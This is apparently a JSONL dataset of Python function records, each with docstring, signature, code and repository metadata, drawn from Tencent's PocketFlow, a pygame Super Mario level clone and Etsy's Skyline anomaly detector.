{"docstring": "\"\"\"Constructor function.\"\"\"\n\n# class-independent initialization\n", "func_signal": "def __init__(self, data_format='channels_last'):\n", "code": "assert data_format == 'channels_last', 'MobileNet only supports \\'channels_last\\' data format'\nsuper(ModelHelper, self).__init__(data_format)\n\n# initialize training & evaluation subsets\nself.dataset_train = Ilsvrc12Dataset(is_train=True)\nself.dataset_eval = Ilsvrc12Dataset(is_train=False)", "path": "PocketFlow/nets/mobilenet_at_ilsvrc12.py", "commit_date": "2019-03-03 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Restore a model from the latest checkpoint files.\n\nArgs:\n* is_train: whether to restore a model for training\n\"\"\"\n\n", "func_signal": "def __restore_model(self, is_train):\n", "code": "save_path = tf.train.latest_checkpoint(os.path.dirname(FLAGS.save_path))\nif is_train:\n  self.saver_train.restore(self.sess_train, save_path)\nelse:\n  self.saver_eval.restore(self.sess_eval, save_path)\ntf.logging.info('model restored from ' + save_path)", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Automatically insert a barrier for multi-GPU training, or pass for single-GPU training.\n\nArgs:\n* mpi_comm: MPI communication object\n\"\"\"\n\n", "func_signal": "def auto_barrier(mpi_comm=None):\n", "code": "if FLAGS.enbl_multi_gpu:\n  mpi_comm.Barrier()\nelse:\n  pass", "path": "PocketFlow/utils/misc_utils.py", "commit_date": "2019-01-15 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Forward pass function.\n\nArgs:\n* inputs: inputs to the network's forward pass\n* is_train: whether to use the forward pass with training operations inserted\n\nReturns:\n* outputs: outputs from the network's forward pass\n\"\"\"\n\n", "func_signal": "def forward_fn(inputs, is_train):\n", "code": "nb_classes = FLAGS.nb_classes\ndepth_mult = FLAGS.mobilenet_depth_mult\n\nif FLAGS.mobilenet_version == 1:\n  scope_fn = MobileNetV1.mobilenet_v1_arg_scope\n  with slim.arg_scope(scope_fn(is_training=is_train)): # pylint: disable=not-context-manager\n    outputs, __ = MobileNetV1.mobilenet_v1(\n      inputs, is_training=is_train, num_classes=nb_classes, depth_multiplier=depth_mult)\nelif FLAGS.mobilenet_version == 2:\n  scope_fn = MobileNetV2.training_scope\n  with slim.arg_scope(scope_fn(is_training=is_train)): # pylint: disable=not-context-manager\n    outputs, __ = MobileNetV2.mobilenet(\n      inputs, num_classes=nb_classes, depth_multiplier=depth_mult)\nelse:\n  raise ValueError('invalid MobileNet version: {}'.format(FLAGS.mobilenet_version))\n\nreturn outputs", "path": "PocketFlow/nets/mobilenet_at_ilsvrc12.py", "commit_date": "2019-03-03 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Constructor function.\n\nArgs:\n* sm_writer: TensorFlow's summary writer\n* model_helper: model helper with definitions of model & dataset\n\"\"\"\n\n# class-independent initialization\n", "func_signal": "def __init__(self, sm_writer, model_helper):\n", "code": "super(UniformQuantTFLearner, self).__init__(sm_writer, model_helper)\n\n# define scopes for full & uniform quantized models\nself.model_scope_full = 'model'\nself.model_scope_quan = 'quant_model'\n\n# download the pre-trained model\nif self.is_primary_worker('local'):\n  self.download_model()  # pre-trained model is required\nself.auto_barrier()\ntf.logging.info('model files: ' + ', '.join(os.listdir('./models')))\n\n# detect unquantized activations nodes\nself.unquant_node_names = []\nif FLAGS.uqtf_enbl_manual_quant:\n  self.unquant_node_names = find_unquant_act_nodes(\n    model_helper, self.data_scope, self.model_scope_quan, self.mpi_comm)\ntf.logging.info('unquantized activation nodes: {}'.format(self.unquant_node_names))\n\n# class-dependent initialization\nif FLAGS.enbl_dst:\n  self.helper_dst = DistillationHelper(sm_writer, model_helper, self.mpi_comm)\nself.__build_train()\nself.__build_eval()", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Train a model and periodically produce checkpoint files.\"\"\"\n\n# initialization\n", "func_signal": "def train(self):\n", "code": "self.sess_train.run(self.init_op)\nself.warm_start(self.sess_train)\nif FLAGS.enbl_multi_gpu:\n  self.sess_train.run(self.bcast_op)\n\n# train the model through iterations and periodically save & evaluate the model\ntime_prev = timer()\nfor idx_iter in range(self.nb_iters_train):\n  # train the model\n  if (idx_iter + 1) % FLAGS.summ_step != 0:\n    self.sess_train.run(self.train_op)\n  else:\n    __, summary, log_rslt = self.sess_train.run([self.train_op, self.summary_op, self.log_op])\n    if self.is_primary_worker('global'):\n      time_step = timer() - time_prev\n      self.__monitor_progress(summary, log_rslt, idx_iter, time_step)\n      time_prev = timer()\n\n  # save & evaluate the model at certain steps\n  if self.is_primary_worker('global') and (idx_iter + 1) % FLAGS.save_step == 0:\n    self.__save_model(is_train=True)\n    self.evaluate()\n\n# save the final model\nif self.is_primary_worker('global'):\n  self.__save_model(is_train=True)\n  self.__restore_model(is_train=False)\n  self.__save_model(is_train=False)\n  self.evaluate()", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Creates the labels that describe each info\"\"\"\n", "func_signal": "def create_info_labels(self):\n", "code": "self.mario_label = []\nself.world_label = []\nself.time_label = []\nself.stage_label = []\n\n\nself.create_label(self.mario_label, 'MARIO', 75, 30)\nself.create_label(self.world_label, 'WORLD', 450, 30)\nself.create_label(self.time_label, 'TIME', 625, 30)\nself.create_label(self.stage_label, '1-1', 472, 55)\n\nself.label_list = [self.mario_label,\n                   self.world_label,\n                   self.time_label,\n                   self.stage_label]", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Get the mario image\"\"\"\n", "func_signal": "def create_mario_image(self):\n", "code": "self.life_times_image = self.get_image(75, 247, 6, 6)\nself.life_times_rect = self.life_times_image.get_rect(center=(378, 295))\nself.life_total_label = []\nself.create_label(self.life_total_label, str(self.total_lives),\n                  450, 285)\n\nself.sprite_sheet = setup.GFX['mario_bros']\nself.mario_image = self.get_image(178, 32, 12, 16)\nself.mario_rect = self.mario_image.get_rect(center=(320, 290))", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates a label (WORLD, TIME, MARIO)\"\"\"\n", "func_signal": "def create_label(self, label_list, string, x, y):\n", "code": "for letter in string:\n    label_list.append(Character(self.image_dict[letter]))\n\nself.set_label_rects(label_list, x, y)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates labels for the center info of a load screen\"\"\"\n", "func_signal": "def create_load_screen_labels(self):\n", "code": "world_label = []\nnumber_label = []\n\nself.create_label(world_label, 'WORLD', 280, 200)\nself.create_label(number_label, '1-1', 430, 200)\n\nself.center_labels = [world_label, number_label]", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Create the label for the GAME OVER screen\"\"\"\n", "func_signal": "def create_game_over_label(self):\n", "code": "game_label = []\nover_label = []\n\nself.create_label(game_label, 'GAME', 280, 300)\nself.create_label(over_label, 'OVER', 400, 300)\n\nself.game_over_label = [game_label, over_label]", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Create the label for the time out screen\"\"\"\n", "func_signal": "def create_time_out_label(self):\n", "code": "time_out_label = []\n\nself.create_label(time_out_label, 'TIME OUT', 290, 310)\nself.time_out_label = [time_out_label]", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates the info that tracks the number of coins Mario collects\"\"\"\n", "func_signal": "def create_coin_counter(self):\n", "code": "self.coin_count_images = []\nself.create_label(self.coin_count_images, '*00', 300, 55)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Create labels for the MAIN MENU screen\"\"\"\n", "func_signal": "def create_main_menu_labels(self):\n", "code": "player_one_game = []\nplayer_two_game = []\ntop = []\ntop_score = []\n\nself.create_label(player_one_game, '1 PLAYER GAME', 272, 360)\nself.create_label(player_two_game, '2 PLAYER GAME', 272, 405)\nself.create_label(top, 'TOP - ', 290, 465)\nself.create_label(top_score, '000000', 400, 465)\n\nself.main_menu_labels = [player_one_game, player_two_game,\n                         top, top_score]", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Set the location of each individual character\"\"\"\n", "func_signal": "def set_label_rects(self, label_list, x, y):\n", "code": "for i, letter in enumerate(label_list):\n    letter.rect.x = x + ((letter.rect.width + 3) * i)\n    letter.rect.y = y\n    if letter.image == self.image_dict['-']:\n        letter.rect.y += 7\n        letter.rect.x += 2", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Updates the coin total and adjusts label accordingly\"\"\"\n", "func_signal": "def update_coin_total(self, level_info):\n", "code": "self.coin_total = level_info[c.COIN_TOTAL]\n\ncoin_string = str(self.coin_total)\nif len(coin_string) < 2:\n    coin_string = '*0' + coin_string\nelif len(coin_string) > 2:\n    coin_string = '*00'\nelse:\n    coin_string = '*' + coin_string\n\nx = self.coin_count_images[0].rect.x\ny = self.coin_count_images[0].rect.y\n\nself.coin_count_images = []\n\nself.create_label(self.coin_count_images, coin_string, x, y)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Draws info during regular game play\"\"\"\n", "func_signal": "def draw_level_screen_info(self, surface):\n", "code": "for info in self.score_images:\n    surface.blit(info.image, info.rect)\n\nfor digit in self.count_down_images:\n        surface.blit(digit.image, digit.rect)\n\nfor character in self.coin_count_images:\n    surface.blit(character.image, character.rect)\n\nfor label in self.label_list:\n    for letter in label:\n        surface.blit(letter.image, letter.rect)\n\nsurface.blit(self.flashing_coin.image, self.flashing_coin.rect)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates the initial empty score (000000)\"\"\"\n", "func_signal": "def create_score_group(self):\n", "code": "self.score_images = []\nself.create_label(self.score_images, '000000', 75, 55)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Updates info based on what state the game is in\"\"\"\n", "func_signal": "def handle_level_state(self, level_info):\n", "code": "if self.state == c.MAIN_MENU:\n    self.score = level_info[c.SCORE]\n    self.update_score_images(self.score_images, self.score)\n    self.update_score_images(self.main_menu_labels[3], self.top_score)\n    self.update_coin_total(level_info)\n    self.flashing_coin.update(level_info[c.CURRENT_TIME])\n\nelif self.state == c.LOAD_SCREEN:\n    self.score = level_info[c.SCORE]\n    self.update_score_images(self.score_images, self.score)\n    self.update_coin_total(level_info)\n\nelif self.state == c.LEVEL:\n    self.score = level_info[c.SCORE]\n    self.update_score_images(self.score_images, self.score)\n    if level_info[c.LEVEL_STATE] != c.FROZEN \\\n            and self.mario.state != c.WALKING_TO_CASTLE \\\n            and self.mario.state != c.END_OF_LEVEL_FALL \\\n            and not self.mario.dead:\n        self.update_count_down_clock(level_info)\n    self.update_coin_total(level_info)\n    self.flashing_coin.update(level_info[c.CURRENT_TIME])\n\nelif self.state == c.TIME_OUT:\n    self.score = level_info[c.SCORE]\n    self.update_score_images(self.score_images, self.score)\n    self.update_coin_total(level_info)\n\nelif self.state == c.GAME_OVER:\n    self.score = level_info[c.SCORE]\n    self.update_score_images(self.score_images, self.score)\n    self.update_coin_total(level_info)\n\nelif self.state == c.FAST_COUNT_DOWN:\n    level_info[c.SCORE] += 50\n    self.score = level_info[c.SCORE]\n    self.update_count_down_clock(level_info)\n    self.update_score_images(self.score_images, self.score)\n    self.update_coin_total(level_info)\n    self.flashing_coin.update(level_info[c.CURRENT_TIME])\n    if self.time == 0:\n        self.state = c.END_OF_LEVEL\n\nelif self.state == c.END_OF_LEVEL:\n    self.flashing_coin.update(level_info[c.CURRENT_TIME])", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates the count down clock for the level\"\"\"\n", "func_signal": "def create_countdown_clock(self):\n", "code": "self.count_down_images = []\nself.create_label(self.count_down_images, str(self.time), 645, 55)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Draws info when on the time out screen\"\"\"\n", "func_signal": "def draw_time_out_screen_info(self, surface):\n", "code": "for info in self.score_images:\n    surface.blit(info.image, info.rect)\n\nfor word in self.time_out_label:\n    for letter in word:\n        surface.blit(letter.image, letter.rect)\n\nfor character in self.coin_count_images:\n    surface.blit(character.image, character.rect)\n\nfor label in self.label_list:\n    for letter in label:\n        surface.blit(letter.image, letter.rect)\n\nsurface.blit(self.flashing_coin.image, self.flashing_coin.rect)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Draws overhead info based on state\"\"\"\n", "func_signal": "def draw(self, surface):\n", "code": "if self.state == c.MAIN_MENU:\n    self.draw_main_menu_info(surface)\nelif self.state == c.LOAD_SCREEN:\n    self.draw_loading_screen_info(surface)\nelif self.state == c.LEVEL:\n    self.draw_level_screen_info(surface)\nelif self.state == c.GAME_OVER:\n    self.draw_game_over_screen_info(surface)\nelif self.state == c.FAST_COUNT_DOWN:\n    self.draw_level_screen_info(surface)\nelif self.state == c.END_OF_LEVEL:\n    self.draw_level_screen_info(surface)\nelif self.state == c.TIME_OUT:\n    self.draw_time_out_screen_info(surface)\nelse:\n    pass", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Draws info for main menu\"\"\"\n", "func_signal": "def draw_main_menu_info(self, surface):\n", "code": "for info in self.score_images:\n    surface.blit(info.image, info.rect)\n\nfor label in self.main_menu_labels:\n    for letter in label:\n        surface.blit(letter.image, letter.rect)\n\nfor character in self.coin_count_images:\n    surface.blit(character.image, character.rect)\n\nfor label in self.label_list:\n    for letter in label:\n        surface.blit(letter.image, letter.rect)\n\nsurface.blit(self.flashing_coin.image, self.flashing_coin.rect)", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Creates the initial images for the score\"\"\"\n", "func_signal": "def create_image_dict(self):\n", "code": "self.image_dict = {}\nimage_list = []\n\nimage_list.append(self.get_image(3, 230, 7, 7))\nimage_list.append(self.get_image(12, 230, 7, 7))\nimage_list.append(self.get_image(19, 230, 7, 7))\nimage_list.append(self.get_image(27, 230, 7, 7))\nimage_list.append(self.get_image(35, 230, 7, 7))\nimage_list.append(self.get_image(43, 230, 7, 7))\nimage_list.append(self.get_image(51, 230, 7, 7))\nimage_list.append(self.get_image(59, 230, 7, 7))\nimage_list.append(self.get_image(67, 230, 7, 7))\nimage_list.append(self.get_image(75, 230, 7, 7))\n\nimage_list.append(self.get_image(83, 230, 7, 7))\nimage_list.append(self.get_image(91, 230, 7, 7))\nimage_list.append(self.get_image(99, 230, 7, 7))\nimage_list.append(self.get_image(107, 230, 7, 7))\nimage_list.append(self.get_image(115, 230, 7, 7))\nimage_list.append(self.get_image(123, 230, 7, 7))\nimage_list.append(self.get_image(3, 238, 7, 7))\nimage_list.append(self.get_image(11, 238, 7, 7))\nimage_list.append(self.get_image(20, 238, 7, 7))\nimage_list.append(self.get_image(27, 238, 7, 7))\nimage_list.append(self.get_image(35, 238, 7, 7))\nimage_list.append(self.get_image(44, 238, 7, 7))\nimage_list.append(self.get_image(51, 238, 7, 7))\nimage_list.append(self.get_image(59, 238, 7, 7))\nimage_list.append(self.get_image(67, 238, 7, 7))\nimage_list.append(self.get_image(75, 238, 7, 7))\nimage_list.append(self.get_image(83, 238, 7, 7))\nimage_list.append(self.get_image(91, 238, 7, 7))\nimage_list.append(self.get_image(99, 238, 7, 7))\nimage_list.append(self.get_image(108, 238, 7, 7))\nimage_list.append(self.get_image(115, 238, 7, 7))\nimage_list.append(self.get_image(123, 238, 7, 7))\nimage_list.append(self.get_image(3, 246, 7, 7))\nimage_list.append(self.get_image(11, 246, 7, 7))\nimage_list.append(self.get_image(20, 246, 7, 7))\nimage_list.append(self.get_image(27, 246, 7, 7))\nimage_list.append(self.get_image(48, 248, 7, 7))\n\nimage_list.append(self.get_image(68, 249, 6, 2))\nimage_list.append(self.get_image(75, 247, 6, 6))\n\n\n\ncharacter_string = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -*'\n\nfor character, image in zip(character_string, image_list):\n    self.image_dict[character] = image", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Updates what numbers are to be blitted for the score\"\"\"\n", "func_signal": "def update_score_images(self, images, score):\n", "code": "index = len(images) - 1\n\nfor digit in reversed(str(score)):\n    rect = images[index].rect\n    images[index] = Character(self.image_dict[digit])\n    images[index].rect = rect\n    index -= 1", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"Extracts image from sprite sheet\"\"\"\n", "func_signal": "def get_image(self, x, y, width, height):\n", "code": "image = pg.Surface([width, height])\nrect = image.get_rect()\n\nimage.blit(self.sprite_sheet, (0, 0), (x, y, width, height))\nimage.set_colorkey((92, 148, 252))\nimage = pg.transform.scale(image,\n                           (int(rect.width*2.9),\n                            int(rect.height*2.9)))\nreturn image", "path": "Mario-Level-1/data/components/info.py", "commit_date": "2014-02-24 00:00:00", "repo_name": "justinmeister/Mario-Level-1", "stars": 2088, "license": "None", "language": "python", "size": 14962}
{"docstring": "\"\"\"\nThis method runs a meta-analysis on the metric to determine whether the\nmetric has a past history of triggering. TODO: weight intervals based on datapoint\n\"\"\"\n# We want the datapoint to avoid triggering twice on the same data\n", "func_signal": "def is_anomalously_anomalous(metric_name, ensemble, datapoint):\n", "code": "new_trigger = [time(), datapoint]\n\n# Get the old history\nraw_trigger_history = redis_conn.get('trigger_history.' + metric_name)\nif not raw_trigger_history:\n    redis_conn.set('trigger_history.' + metric_name, packb([(time(), datapoint)]))\n    return True\n\ntrigger_history = unpackb(raw_trigger_history)\n\n# Are we (probably) triggering on the same data?\nif (new_trigger[1] == trigger_history[-1][1] and\n        new_trigger[0] - trigger_history[-1][0] <= 300):\n            return False\n\n# Update the history\ntrigger_history.append(new_trigger)\nredis_conn.set('trigger_history.' + metric_name, packb(trigger_history))\n\n# Should we surface the anomaly?\ntrigger_times = [x[0] for x in trigger_history]\nintervals = [\n    trigger_times[i + 1] - trigger_times[i]\n    for i, v in enumerate(trigger_times)\n    if (i + 1) < len(trigger_times)\n]\n\nseries = pandas.Series(intervals)\nmean = series.mean()\nstdDev = series.std()\n\nreturn abs(intervals[-1] - mean) > 3 * stdDev", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nAssign a bunch of metrics for a process to analyze.\n\"\"\"\n# Discover assigned metrics\n", "func_signal": "def spin_process(self, i, unique_metrics):\n", "code": "keys_per_processor = int(ceil(float(len(unique_metrics)) / float(settings.ANALYZER_PROCESSES)))\nif i == settings.ANALYZER_PROCESSES:\n    assigned_max = len(unique_metrics)\nelse:\n    assigned_max = i * keys_per_processor\nassigned_min = assigned_max - keys_per_processor\nassigned_keys = range(assigned_min, assigned_max)\n\n# Compile assigned metrics\nassigned_metrics = [unique_metrics[index] for index in assigned_keys]\n\n# Check if this process is unnecessary\nif len(assigned_metrics) == 0:\n    return\n\n# Multi get series\nraw_assigned = self.redis_conn.mget(assigned_metrics)\n\n# Make process-specific dicts\nexceptions = defaultdict(int)\nanomaly_breakdown = defaultdict(int)\n\n# Distill timeseries strings into lists\nfor i, metric_name in enumerate(assigned_metrics):\n    self.check_if_parent_is_alive()\n\n    try:\n        raw_series = raw_assigned[i]\n        unpacker = Unpacker(use_list = False)\n        unpacker.feed(raw_series)\n        timeseries = list(unpacker)\n\n        anomalous, ensemble, datapoint = run_selected_algorithm(timeseries, metric_name)\n\n        # If it's anomalous, add it to list\n        if anomalous:\n            base_name = metric_name.replace(settings.FULL_NAMESPACE, '', 1)\n            metric = [datapoint, base_name]\n            self.anomalous_metrics.append(metric)\n\n            # Get the anomaly breakdown - who returned True?\n            for index, value in enumerate(ensemble):\n                if value:\n                    algorithm = settings.ALGORITHMS[index]\n                    anomaly_breakdown[algorithm] += 1\n\n    # It could have been deleted by the Roomba\n    except TypeError:\n        exceptions['DeletedByRoomba'] += 1\n    except TooShort:\n        exceptions['TooShort'] += 1\n    except Stale:\n        exceptions['Stale'] += 1\n    except Boring:\n        exceptions['Boring'] += 1\n    except:\n        exceptions['Other'] += 1\n        logger.info(traceback.format_exc())\n\n# Add values to the queue so the parent process can collate\nfor key, value in anomaly_breakdown.items():\n    self.anomaly_breakdown_q.put((key, value))\n\nfor key, value in exceptions.items():\n    self.exceptions_q.put((key, value))", "path": "skyline/src/analyzer/analyzer.py", "commit_date": "2013-12-04 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if 2 sample Kolmogorov-Smirnov test indicates\nthat data distribution for last 10 minutes is different from last hour.\nIt produces false positives on non-stationary series so Augmented\nDickey-Fuller test applied to check for stationarity.\n\"\"\"\n\n", "func_signal": "def ks_test(timeseries):\n", "code": "hour_ago = time() - 3600\nten_minutes_ago = time() - 600\nreference = scipy.array([x[1] for x in timeseries if x[0] >= hour_ago and x[0] < ten_minutes_ago])\nprobe = scipy.array([x[1] for x in timeseries if x[0] >= ten_minutes_ago])\n\nif reference.size < 20 or probe.size < 20:\n    return False\n\nks_d, ks_p_value = scipy.stats.ks_2samp(reference, probe)\n\nif ks_p_value < 0.05 and ks_d > 0.5:\n    adf = sm.tsa.stattools.adfuller(reference, 10)\n    if adf[1] < 0.05:\n        return True\n\nreturn False", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nListen for pickles over tcp\n\"\"\"\n", "func_signal": "def listen_pickle(self):\n", "code": "while 1:\n    try:\n        # Set up the TCP listening socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((self.ip, self.port))\n        s.setblocking(1)\n        s.listen(5)\n        logger.info('listening over tcp for pickles on %s' % self.port)\n\n        (conn, address) = s.accept()\n        logger.info('connection from %s:%s' % (address[0], self.port))\n\n        chunk = []\n        while 1:\n            self.check_if_parent_is_alive()\n            try:\n                length = Struct('!I').unpack(self.read_all(conn, 4))\n                body = self.read_all(conn, length[0])\n\n                # Iterate and chunk each individual datapoint\n                for bunch in self.gen_unpickle(body):\n                    for metric in bunch:\n                        chunk.append(metric)\n\n                        # Queue the chunk and empty the variable\n                        if len(chunk) > settings.CHUNK_SIZE:\n                            try:\n                                self.q.put(list(chunk), block=False)\n                                chunk[:] = []\n\n                            # Drop chunk if queue is full\n                            except Full:\n                                logger.info('queue is full, dropping datapoints')\n                                chunk[:] = []\n\n            except Exception as e:\n                logger.info(e)\n                logger.info('incoming connection dropped, attempting to reconnect')\n                break\n\n    except Exception as e:\n        logger.info('can\\'t connect to socket: ' + str(e))\n        break", "path": "skyline/src/horizon/listen.py", "commit_date": "2014-06-19 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nFilter timeseries and run selected algorithm.\n\"\"\"\n# Get rid of short series\n", "func_signal": "def run_selected_algorithm(timeseries, metric_name):\n", "code": "if len(timeseries) < MIN_TOLERABLE_LENGTH:\n    raise TooShort()\n\n# Get rid of stale series\nif time() - timeseries[-1][0] > STALE_PERIOD:\n    raise Stale()\n\n# Get rid of boring series\nif len(set(item[1] for item in timeseries[-MAX_TOLERABLE_BOREDOM:])) == BOREDOM_SET_SIZE:\n    raise Boring()\n\ntry:\n    ensemble = [globals()[algorithm](timeseries) for algorithm in ALGORITHMS]\n    threshold = len(ensemble) - CONSENSUS\n    if ensemble.count(False) <= threshold:\n        if ENABLE_SECOND_ORDER:\n            if is_anomalously_anomalous(metric_name, ensemble, timeseries[-1][1]):\n                return True, ensemble, timeseries[-1][1]\n        else:\n            return True, ensemble, timeseries[-1][1]\n\n    return False, ensemble, timeseries[-1][1]\nexcept:\n    logging.error(\"Algorithm error: \" + traceback.format_exc())\n    return False, [], 1", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nInitialize the Analyzer\n\"\"\"\n", "func_signal": "def __init__(self, parent_pid):\n", "code": "super(Analyzer, self).__init__()\nself.redis_conn = StrictRedis(unix_socket_path = settings.REDIS_SOCKET_PATH)\nself.daemon = True\nself.parent_pid = parent_pid\nself.current_pid = getpid()\nself.anomalous_metrics = Manager().list()\nself.exceptions_q = Queue()\nself.anomaly_breakdown_q = Queue()", "path": "skyline/src/analyzer/analyzer.py", "commit_date": "2013-12-04 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the absolute value of the average of the latest\nthree datapoint minus the moving average is greater than three standard\ndeviations of the moving average. This is better for finding anomalies with\nrespect to the short term trends.\n\"\"\"\n", "func_signal": "def stddev_from_moving_average(timeseries):\n", "code": "series = pandas.Series([x[1] for x in timeseries])\nexpAverage = pandas.stats.moments.ewma(series, com=50)\nstdDev = pandas.stats.moments.ewmstd(series, com=50)\n\nreturn abs(series.iget(-1) - expAverage.iget(-1)) > 3 * stdDev.iget(-1)", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the Z score is greater than the Grubb's score.\n\"\"\"\n\n", "func_signal": "def grubbs(timeseries):\n", "code": "series = scipy.array([x[1] for x in timeseries])\nstdDev = scipy.std(series)\nmean = np.mean(series)\ntail_average = tail_avg(timeseries)\nz_score = (tail_average - mean) / stdDev\nlen_series = len(series)\nthreshold = scipy.stats.t.isf(.05 / (2 * len_series), len_series - 2)\nthreshold_squared = threshold * threshold\ngrubbs_score = ((len_series - 1) / np.sqrt(len_series)) * np.sqrt(threshold_squared / (len_series - 2 + threshold_squared))\n\nreturn z_score > grubbs_score", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
